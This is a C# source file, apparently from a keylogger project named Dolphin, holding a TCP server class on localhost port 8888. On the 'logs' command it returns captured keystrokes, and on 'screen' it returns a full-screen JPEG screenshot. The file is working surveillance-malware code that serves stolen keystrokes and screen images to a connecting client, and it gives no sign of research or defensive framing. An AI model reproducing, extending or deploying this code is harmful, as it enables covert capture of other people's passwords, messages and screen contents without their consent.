using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Dolphin
{
    static class Server
    {
        private static string DataToSend { get; set; } = "";

        public static void Run(KeyLogger logger)
        {
            IPAddress localAddress = IPAddress.Parse("127.0.0.1");
            int port = 8888;
            TcpListener listener = new TcpListener(localAddress, port);
            listener.Start();
            logger.IsFull += CopyData;
            byte[] buffer = new byte[255];
            try
            {
                while (true)
                {
                    TcpClient client = listener.AcceptTcpClient();
                    NetworkStream stream = client.GetStream();


                    int bytes = stream.Read(buffer, 0, buffer.Length);
                    string command = Encoding.UTF8.GetString(buffer, 0, bytes);
                    if (command == "quit")
                    {
                        byte[] data = Encoding.UTF8.GetBytes("OK");
                        stream.Write(data, 0, data.Length);
                        break;
                    }
                    if (command == "logs")
                    {
                        CopyData(logger.LogsStream);
                        SendLogs(stream);
                    }
                    else if (command == "screen")
                    {
                        SendScreen(stream);
                    }

                    stream.Close();
                    client.Close();
                }

            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                throw;
            }
            finally
            {
                listener.Stop();
            }
        }

        private static void CopyData(StringBuilder stream)
        {
            DataToSend = stream.ToString();
            stream.Clear();
        }

        private static void SendLogs(NetworkStream stream)
        {
            byte[] data = Encoding.UTF8.GetBytes(DataToSend);

            stream.Write(data, 0, data.Length);
            DataToSend = "";
        }
        private static void SendScreen(NetworkStream stream)
        {
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            using var memoryStream = new MemoryStream();
            using var bitmap = new Bitmap(bounds.Width, bounds.Height);
            using (Graphics g = Graphics.FromImage(bitmap))
            {
                g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
            }

            bitmap.Save(memoryStream, ImageFormat.Jpeg);
            byte[] data = memoryStream.ToArray();
            stream.Write(data, 0, data.Length);
        }
    }

}
